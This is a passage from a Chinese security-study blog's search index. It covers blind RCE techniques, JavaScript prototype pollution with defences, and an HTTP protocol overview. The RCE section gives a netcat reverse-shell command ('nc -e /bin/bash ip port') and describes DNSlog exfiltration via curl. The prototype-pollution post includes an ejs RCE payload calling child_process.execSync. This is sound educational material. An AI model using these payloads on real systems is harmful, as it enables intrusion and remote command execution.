class="headerlink" title="无回显RCE"></a>无回显RCE</h2><h4 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h4><p>条件：具有nc</p><p>命令</p><p> nc -e /bin/bash ip port</p><p>然后再在服务器上开启端口接听</p><h4 id="dnslog"><a href="#dnslog" class="headerlink" title="dnslog"></a>dnslog</h4><p>发起一个dns请求需要通过linux中的<code>ping</code>命令或者<code>curl</code>命令</p><p>然后这里一个dnslog的利用平台：ceye <a href="http://ceye.io/">http://ceye.io/</a></p><p>作为命令的分隔符，然后发起<code>curl</code>请求，然后最后用反引号执行命令</p><h4 id="文件下载"><a href="#文件下载" class="headerlink" title="文件下载"></a>文件下载</h4><p>特定情况下压缩flag文件,并访问</p>]]></content>
      
      
      
        <tags>
            
            <tag> web安全 </tag>
            
            <tag> 基础漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaScript的原型链污染</title>
      <link href="/2023/07/26/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/"/>
      <url>/2023/07/26/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/</url>
      
        <content type="html"><![CDATA[<h1 id="js原型链污染"><a href="#js原型链污染" class="headerlink" title="js原型链污染"></a>js原型链污染</h1><h2 id="基础概念辨析"><a href="#基础概念辨析" class="headerlink" title="基础概念辨析"></a>基础概念辨析</h2><h3 id="原型"><a href="#原型" class="headerlink" title="原型"></a><strong>原型</strong></h3><p>js中一切皆对象,js的每个对象都有一个属性原型（prototype），原型本身也是一个对象，因此该原型也有一个prototype指向上层原型，直到为null，这样就构成了原型链</p><p>简单来说，原型链是javascript中类继承的一种机制，每个对象都有对应的原型，储存了定义的属性和方法，之中包含了prototype，指向上一级的原型。最上层Object原型中的prototype为null</p><p><strong>特性</strong></p><p>类定义中的属性，会在创建对象时在对象中创建，类定义的方法而是存在于原型之中。当使用没有定义的属性和方法时，就会顺着原型链一直寻找，直到为undefined,用此来实现继承，子类能用父类的属性和方法</p><p>示例</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">Person</span><span class="token punctuation">(</span><span class="token parameter">name</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>       <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>   <span class="token punctuation">}</span>   <span class="token class-name">Person</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function-variable function">greet</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>       console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">Hello, my name is </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span><span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token interpolation-punctuation punctuation">}</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">}</span><span class="token punctuation">;</span>   <span class="token keyword">const</span> person1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token string">'Alice'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   person1<span class="token punctuation">.</span><span class="token function">greet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 输出 "Hello, my name is Alice"</span></code></pre><p><img src="/./js.jpg" alt="img"></p><p>​<em>person1对象原型对象展示</em></p><p><strong>prototype与__proto__</strong></p><p>(1)所有引用类型（函数，数组，对象）都拥有<code>__proto__</code>属性（隐式原型）,用来查看其原型</p><p>(2)所有函数拥有<code>prototype</code>属性（显式原型）（仅限函数）</p><p> 简单来说，<strong>proto</strong> 属性是指向该对象的原型，而 prototype属性是用于创建该对象的构造函数的原型。</p><h3 id="Function-与function"><a href="#Function-与function" class="headerlink" title="Function 与function"></a>Function 与function</h3><p>function是一个定义函数的关键字，Function是代表所有函数的内置原型对象</p><p>每一个js 的function都是Function对象，Function是js内置对象，用以实现很多基本功能，如Nunmber,toString</p><p>constructor是一个对象数据属性属性,创建对象后，访问constructor属性，可以返回构造该对象的来源（不是该对象的原型链上级）</p><h3 id="new"><a href="#new" class="headerlink" title="new"></a>new</h3><p>new constructor[([arguments])]</p><p>参数</p><p><code>constructor</code></p><p>一个指定对象实例的类型的类或函数。</p><p>描述</p><p><code>new</code> 关键字会进行如下的操作：</p><ol><li>创建一个空的简单 JavaScript 对象（即 <code>{}</code>）；</li><li>为步骤 1 新创建的对象添加属性 <code>__proto__</code>，将该属性链接至构造函数的原型对象；</li><li>将步骤 1 新创建的对象作为 <code>this</code> 的上下文；</li><li>如果该函数没有返回对象，则返回 <code>this</code>。</li></ol><h3 id="原型链污染"><a href="#原型链污染" class="headerlink" title="原型链污染"></a>原型链污染</h3><p>当我们添加或者修改上层原型的一些属性，子类都又调用该恶意属性时，子类调用的属性已经被我们篡改，造成原型链污染，原型链污染可能会造成命令执行(rce)或者任意文件读取,越权等等</p><p>示例</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">merge</span><span class="token punctuation">(</span><span class="token parameter">target<span class="token punctuation">,</span> source</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> key <span class="token keyword">in</span> source<span class="token punctuation">)</span> <span class="token punctuation">{</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span>key <span class="token keyword">in</span> source <span class="token operator">&amp;&amp;</span> key <span class="token keyword">in</span> target<span class="token punctuation">)</span> <span class="token punctuation">{</span>              <span class="token comment">// 如果target与source有相同的键名 则让target的键值为source的键值</span>              <span class="token function">merge</span><span class="token punctuation">(</span>target<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">,</span> source<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">)</span>          <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>              target<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">=</span> source<span class="token punctuation">[</span>key<span class="token punctuation">]</span>  <span class="token comment">// 如果target与source没有相通的键名 则直接在target新建键名并赋给键值</span>          <span class="token punctuation">}</span>      <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token keyword">let</span> o1 <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>  <span class="token keyword">let</span> o2 <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span><span class="token string">'{ "a": 1, "__proto__": { "b": 2} }'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">merge</span><span class="token punctuation">(</span>o1<span class="token punctuation">,</span> o2<span class="token punctuation">)</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>o1<span class="token punctuation">.</span>a<span class="token punctuation">,</span> o1<span class="token punctuation">.</span>b<span class="token punctuation">)</span>  o3 <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>o3<span class="token punctuation">.</span>b<span class="token punctuation">)</span></code></pre><p>漏洞点</p><p>一般对对象进行复制拷贝,如merge函数或者copy函数，会将传入的json数据拷贝至已创建对象，此时可能会产生原型链污染</p><h4 id="ejs模板基于原型链污染的rce"><a href="#ejs模板基于原型链污染的rce" class="headerlink" title="ejs模板基于原型链污染的rce"></a>ejs模板基于原型链污染的rce</h4><p>直接上POC</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript">a<span class="token punctuation">;</span> <span class="token keyword">return</span> global<span class="token punctuation">.</span>process<span class="token punctuation">.</span>mainModule<span class="token punctuation">.</span>constructor<span class="token punctuation">.</span><span class="token function">_load</span><span class="token punctuation">(</span><span class="token string">'child_process'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">execSync</span><span class="token punctuation">(</span><span class="token string">'whoami'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//</span></code></pre><p>参考学习：<a href="https://evi0s.com/2019/08/30/expresslodashejs-%e4%bb%8e%e5%8e%9f%e5%9e%8b%e9%93%be%e6%b1%a1%e6%9f%93%e5%88%b0rce/">https://evi0s.com/2019/08/30/expresslodashejs-%e4%bb%8e%e5%8e%9f%e5%9e%8b%e9%93%be%e6%b1%a1%e6%9f%93%e5%88%b0rce/</a></p><h3 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h3><p>对于<code>toUpperCase()</code>函数</p><pre class="language-none"><code class="language-none">字符"ı"、"ſ" 经过toUpperCase处理后结果为 "I"、"S"</code></pre><p>对于<code>toLowerCase</code></p><pre class="language-none"><code class="language-none">字符"K"经过toLowerCase处理后结果为"k"(这个K不是K)</code></pre><p>详情可见p神的文章<a href="https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html">https://www.leavesongs.com</a></p><p>python中也存在原型链污染</p><p>可参考文章：<a href="https://tttang.com/archive/1876">https://tttang.com/archive/1876</a></p><p>ctf例题：<a href="https://chenlvtang.top/2021/08/17/NodeJs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E7%9A%84%E5%AE%9E%E8%B7%B5">https://chenlvtang.top/2021/08/17/NodeJs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E7%9A%84%E5%AE%9E%E8%B7%B5</a></p><h1 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h1><p>1.Object.freeze()冻结原型</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript">Object<span class="token punctuation">.</span><span class="token function">freeze</span><span class="token punctuation">(</span><span class="token class-name">Object</span><span class="token punctuation">.</span>prototype<span class="token punctuation">)</span><span class="token punctuation">;</span>Object<span class="token punctuation">.</span><span class="token function">freeze</span><span class="token punctuation">(</span>Object<span class="token punctuation">)</span></code></pre><p>冻结原型后，无法添加新的原型至原型链</p><p>2.对JSON输入验证</p><p>npm上有很多库，如avj，可以对JSON数据验证，排除json中数据中不需要的属性</p><p>或者在复制对象时，遍历键名时候，检查__proto__和prototype</p><p>3.使用map代替{}</p><p>4.使用Object.create()安全创建对象</p><p>这样创建的对象没有属性</p><p>5.node.js中可以通过disable-proto直接禁止操作原型链</p>]]></content>
      
      
      
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>http概述</title>
      <link href="/2023/07/20/http%E6%A6%82%E8%BF%B0/"/>
      <url>/2023/07/20/http%E6%A6%82%E8%BF%B0/</url>
      
        <content type="html"><![CDATA[<hr><ul><li><h4 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h4><p>​Web 使用一种名为 HTTP（超文本传输协议 ）的协议作为规范，完成从客户端到服务器端等一系列运作流 程。而协议是指规则的约定。Web 是建立在 HTTP 协议上通 信的。 http协议主要是计算机网络系统上的应   用层。</p></li><li><h4 id="TCP-IP协议族"><a href="#TCP-IP协议族" class="headerlink" title="TCP/IP协议族"></a>TCP/IP协议族</h4><h5 id="主要内容："><a href="#主要内容：" class="headerlink" title="主要内容："></a>主要内容：</h5></li></ul><pre class="language-none"><code class="language-none">应用层：FTP（文件传输协议）和DNS（域名系统）和http协议传输层：TCP（传输控制协议）和UDP（用户数据报协议）网络层：处理在网络上流动的数据包 链路层：处理连接网络的硬件部分 </code></pre><ul><li><h4 id="IP、TCP和DNS："><a href="#IP、TCP和DNS：" class="headerlink" title="IP、TCP和DNS："></a>IP、TCP和DNS：</h4></li></ul><pre class="language-none"><code class="language-none">**IP**IP地址：指明被分配的地址MAC地址：指网卡所属固定的地址运作方式：利用IP指明目标，中转时利用下一站中转设备的MAC地址搜素下一个中转目标。利用ARP协议可以根据IP地址解析出MAC地址。**TCP**TCP提供字节流服务，把数据分割，并通过带SYN/ACK的数据包（三次）确定是否最终传送到对方。**DNS**提供域名和IP之间解析服务</code></pre><ul><li><h4 id="URI和URL"><a href="#URI和URL" class="headerlink" title="URI和URL"></a>URI和URL</h4><p>​URI：是由某个协议方案表示的资源的定位标识符</p><p>​URL:是使用 Web 浏览器等 访问 Web 页面时需要输入的网页地址 </p><p>​URI格式：协议方案名+登录信息（认证）+服务器地址+服务器端口号+带层次的文件路径+查询字符串+片段标识符如：<a href="http://user:pass@www.example.jp/dir/index.htm?uid=1#ch1">http://user:pass@www.example.jp:80/dir/index.htm?uid=1#ch1</a></p><p>​</p></li></ul><p></p><h3 id="简单的http协议"><a href="#简单的http协议" class="headerlink" title="简单的http协议"></a>简单的http协议</h3><hr><p>HTTP 协议规定，请求从客户端发出，最后服务器端响应该请求并返回。</p><p>​ <strong>请求报文</strong>：主要由请求方法、请求URI、协议版本、可选的请求首部字段和内容实体构成。</p><p>​<strong>响应报文</strong>：基本由协议版本、状态码（表示请求成功或失败的数字代码）、用以解释状态码的原因短语、可选的响应首部字段以及实体构成。 </p><h5 id="HTTP方法"><a href="#HTTP方法" class="headerlink" title="HTTP方法"></a>HTTP方法</h5><pre class="language-none"><code class="language-none">**GET: 获取资源**GET方法用来请求访问已被 URI 识别的资源**POST: 传输实体主体****PUT： 传输文件**由于PUT方法自身不带验证机制，存在安全性问题，一般的 Web 网站不使用该方法**HEARD ：获取报文首部**不返回报文主体部分。用于确认URI的有效性及资源更新的日期时间等**DELETE： 删除文件****OPTIONS： 查询支持方法**用来查询针对URI指定的资源支持的方法**TRACE: 追踪路径**让 Web 服务器端将之前的请求通信环回给客户端的方法。客户端通过 TRACE 方法可以查询发送出去的请求是怎样被加工修改/篡改的。容易引发XST攻击**CONNECT：要求用隧道协议连接代理**方法要求在与代理服务器通信时建立隧道，实现用隧道协议进行 TCP 通信。主要使用 SSL（安全套接层）和 TLS（传输层安全）协议把通信内容加密后经网络隧道传输。</code></pre><p>​管线化：利用持久化连接，发送请求后不用等待回应就可直接发送下一个请求。</p><p>​<strong>Cookie</strong>:通常用于判断两个请求是否来自同一浏览器，Cookie 技术通过在请求和响应报文中写入 Cookie 信息来控制客户端的状态 。</p><h3 id="http报文"><a href="#http报文" class="headerlink" title="http报文"></a>http报文</h3><hr><h4 id="HTTP信息"><a href="#HTTP信息" class="headerlink" title="HTTP信息"></a>HTTP信息</h4><p>​首部内容：请求行、状态行、首部字段</p><p>​报文：是 HTTP 通信中的基本单位，由 8 位组字节流组成，通过 HTTP 通信传输。 </p><p>​实体：作为请求或响应的有效载荷数据（补充项）被传输，其内容由实 体首部和实体主体组成。 </p><p>​常见压缩传输的内容编码：gzip、compress、deflate、identity</p><h5 id="多部分对象集合"><a href="#多部分对象集合" class="headerlink" title="多部分对象集合"></a>多部分对象集合</h5><ul><li><p>multipart/form-data</p><p>​web表单文件上传时使用</p></li><li><p>multipart/byteranges</p><p>​状态码206响应报文包含了多个范围的内容时使用</p><p>获取部分内容的范围请求：用到首部字段Range来指定资源的byte范围</p><p>内容协商技术：服务器驱动协商、客户端驱动协商、透明协商</p></li></ul><h3 id="http状态码"><a href="#http状态码" class="headerlink" title="http状态码"></a>http状态码</h3><hr><h5 id="状态码类别"><a href="#状态码类别" class="headerlink" title="状态码类别"></a>状态码类别</h5><table><thead><tr><th></th><th>类别</th><th>原因短语</th></tr></thead><tbody><tr><td>1XX</td><td>信息性状态码</td><td>接收的请求正在处理</td></tr><tr><td>2XX</td><td>成功状态码</td><td>请求正常处理完毕</td></tr><tr><td>3XX</td><td>重向状态码</td><td>需要进行附加操作以完成请求</td></tr><tr><td>4XX</td><td>客户端错误状态码</td><td>服务器无法处理请求</td></tr><tr><td>5XX</td><td>服务器错误状态码</td><td>服务器处理出错</td></tr></tbody></table><h5 id="14种常见的状态码"><a href="#14种常见的状态码" class="headerlink" title="14种常见的状态码"></a>14种常见的状态码</h5><pre class="language-none"><code class="language-none">**200 OK**请求被正常处理**204 No Content**请求已成功处理，但响应报文中不含实体的主体部分，也不允许返回任何实体的主体**206 Partial Content**客户端进行了范围请求，服务器成功执行请求，响应报文中包含由Content-Range指定范围的实体范围**301 Moved Permanently**永久性定向。--请求的资源已经被分配到了新的URI**302 Found**临时性重定向。**303 See Other**表示请求对应的资源存在另一个URI，应使用GET方法定向获取请求资源**304 Not Modified**无需再次传输请求的内容，可以使用缓存的内容。**307 Temporary Redirect**临时重定向,保持原有信息**400 Bad Request**报文中存在语法错误，需要修改请求重新发送**401 Unauthorized**表示发送请求需要有通过HTTP认证的认证信息，若之前进行过1次请求，则表示用户认证失败**403 Forbidden请求资源的访问被服务器拒绝**404 Not Found**服务器上无法找到请求的资源**500 Internal Server Error**服务器在执行请求时发生了错误，也有可能是Web应用存在的bug或临时的故障**503 Service Unavailable**服务器暂时处于超负载或正在进行停机维护，现在无法处理请求</code></pre><h3 id="web服务器"><a href="#web服务器" class="headerlink" title="web服务器"></a>web服务器</h3><hr><h4 id="通信数据转发程序"><a href="#通信数据转发程序" class="headerlink" title="通信数据转发程序"></a>通信数据转发程序</h4><pre class="language-none"><code class="language-none">**代理**作为客户端和服务器的‘中间人’缓存代理：会预先把资源的副本（缓存）保存在代理服务器上透明代理：转发请求或响应时，不对报文做任何加工代理**网关**转发来自其他服务器通信数据的服务器，对客户端的请求进行处理网关可以使通信线路上的服务器提供非HTTP协议服务，提高安全性。**隧道**是在相隔甚远的客户端和服务器之间进行中转，并保持双方通信连接的应用程序目的是为了进行安全的通信</code></pre><h5 id="http出现之前的协议"><a href="#http出现之前的协议" class="headerlink" title="http出现之前的协议"></a>http出现之前的协议</h5><p>​FTP:传输文件时使用的协议</p><p>​NNTP：用于 NetNews 电子会议室内传送消息的协议 </p><p>​Archie ：搜索 anonymous FTP 公开的文件信息的协议 </p><p>​WAIS ：以关键词检索多个数据库使用的协议 </p><p>​Gopher ：查找与互联网连接的计算机内信息的协议 </p><h3 id="HTTP首部"><a href="#HTTP首部" class="headerlink" title="HTTP首部"></a>HTTP首部</h3><p>​首部字段结构：手段字段名：字段值</p><h5 id="通用首部"><a href="#通用首部" class="headerlink" title="通用首部"></a>通用首部</h5><pre class="language-none"><code class="language-none">**Cache-Control 控制缓存的行为**指令:public 表明其他用户也可利用缓存 private 响应只能以特殊用户作为对象 no-cache 用户端不接受缓存过的响应，缓存服务器不能进行缓存 no-store 表明请求和响应中包含机密信息，不能进行缓存 s-maxage=...（秒）    指定缓存期限和认证的指令 min-fresh=...（秒）指示客户端允许存储的响应至少 N 秒是新鲜的 max-stale=...（秒）可指示缓存资源，处于指定范围内，过期也可以接受。 only-if-cached客户端仅在缓存服务器本地缓存目标资源的情况下才会要求其返回 must—revalidate代理会向源服务器再次验证即将返回的响应缓存目前是否仍然有效。 proxy-revalidate缓存服务器在接收到客户端带有该指令的请求返回响应之前，必须再次验证缓存的有效性 no-transform 缓存都不能改变实体主体的媒体类型 **Connection 逐跳首部、连接的管理**指令close 服务器想断开连接 Keep-Alive 旧版本http协议实现持久化连接**Date 创建报文的日期时间**格式：如Tue, 03 Jul 2012 04:40:59 GM或者Tue Jul 03 04:40:59 2012**Pragma 报文指令**指令：no-cache 只在客户端请求中，所有中间服务器不返回缓存资源**Trailer 报文末端的首部一览**允许发送方在分块发送的消息后面添加额外的元信息**Transfer-Encoding 指定报文主体的传输编码方式****Upgrade 升级为其他协议****Via 代理服务器的相关信息**追踪报文传输路径**Warning 错误通知**格式：[警告码][警告的主机:端口号]“[警告内容]”([日期时间])</code></pre><h5 id="请求首部字段"><a href="#请求首部字段" class="headerlink" title="请求首部字段"></a>请求首部字段</h5><pre class="language-none"><code class="language-none">首部字段名 说明**Accept 用户代理可处理的媒体类型**q=（0-1）用来权衡优先级，默认为1，前用；间隔**Accept-Charset 优先的字符集****Accept-Encoding 优先的内容编码**内容编码优先级**Accept-Language 优先的语言（自然语言）****Authorization Web认证信息****Expect 期待服务器的特定行为**错误返回状态码417 Expectation Failed**From 用户的电子邮箱地址****Host 请求资源所在服务器****If-Match 比较实体标记（ETag）**If-xxx 为条件请求，条件为真时执行*If-Modified-Since 比较资源的更新时间*如果请求的资源都没有过更新，则返回状态码 304 Not Modified 的响应**If-None-Match 比较实体标记（与 If-Match 相反）****If-Range 资源未更新时发送实体 Byte 的范围请求**If-Unmodified-Since 比较资源的更新时间（与If-Modified-Since相反）如果在指定日期时间后发生了更新，则以状态码 412 Precondition Failed 作为响应返回。**Max-Forwards 最大传输逐跳数**当值为0时，经过的服务器不在进行转发，直接返回响应**Proxy-Authorization 代理服务器要求客户端的认证信息****Range 实体的字节范围请求****Referer 对请求中URI的原始获取方****TE 传输编码的优先级****User-Agent 客户端程序的信息**将创建的请求的浏览器和用户代理名称等信息传达给服务器</code></pre><h5 id="响应首部字段"><a href="#响应首部字段" class="headerlink" title="响应首部字段"></a>响应首部字段</h5><pre class="language-none"><code class="language-none">首部字段名    说明**Accept-Ranges 是否接受字节范围请求****Age 推算资源创建经过时间****ETag 资源的匹配信息**用户端实体标识**Location 令客户端重定向至指定URI****Proxy-Authenticate 代理服务器对客户端的认证信息**服务器是安装http服务器的应用程序是信息**Retry-After 对再次发起请求的时机要求****Server     HTTP服务器的安装信息**服务器是安装http服务器的应用程序是信息**Vary 代理服务器缓存的管理信息****WWW-Authenticate 服务器对客户端的认证信息**http访问认证</code></pre><h5 id="实体首部字段"><a href="#实体首部字段" class="headerlink" title="实体首部字段"></a>实体首部字段</h5><pre class="language-none"><code class="language-none">首部字段名 说明**Allow 资源可支持的HTTP方法****Content-Encoding 实体主体适用的编码方式****Content-Language 实体主体的自然语言****Content-Length 实体主体的大小（单位：字节）****Content-Location 替代对应资源的URI****Content-MD5 实体主体的报文摘要**判断报文的准确性**Content-Range 实体主体的位置范围****Content-Type 实体主体的媒体类型****Expires 实体主体过期的日期时间****Last-Modified 资源的最后修改日期时间**</code></pre><h5 id="为-Cookie-服务的首部字段"><a href="#为-Cookie-服务的首部字段" class="headerlink" title="为 Cookie 服务的首部字段"></a>为 Cookie 服务的首部字段</h5><pre class="language-none"><code class="language-none">**Set-Cookie**expires:浏览器可发送cookie的有效期path：限定cookie发送范围的文件目录domain：指定域名与结尾匹配可发送cookiesecure：web仅在HTTPS时，才发送cookieHttpOnly：使JavaScript无法获取cookie，防止xss攻击对信息的窃取</code></pre><h5 id="其他首部字段"><a href="#其他首部字段" class="headerlink" title="其他首部字段"></a>其他首部字段</h5><pre class="language-none"><code class="language-none">**X-Frame-Options 用于控制网站内容在其他 Web 网站的 Frame 标签内的显示问题 **响应首部DENY：拒绝SAMEORIGIN：仅同域名下页面匹配时许可**X-XSS-Protection 于控制浏览器 XSS 防护机制的开关**响应首部0：无效1： 有效**DNT 拒绝个人信息被收集**请求首部0：同意被跟踪1：拒绝被跟踪*P3P 在线隐私偏好平台**</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> web基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2023/07/19/hello-world/"/>
      <url>/2023/07/19/hello-world/</url>
      
        <content type="html"><![CDATA[<h2 id="第一篇博客"><a href="#第一篇博客" class="headerlink" title="第一篇博客"></a>第一篇博客</h2><p>​不知道怎么看别人大佬的文章都是好看的博客，也非常系统，然后就想建个自己的博客。成功搭建博客系统。</p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
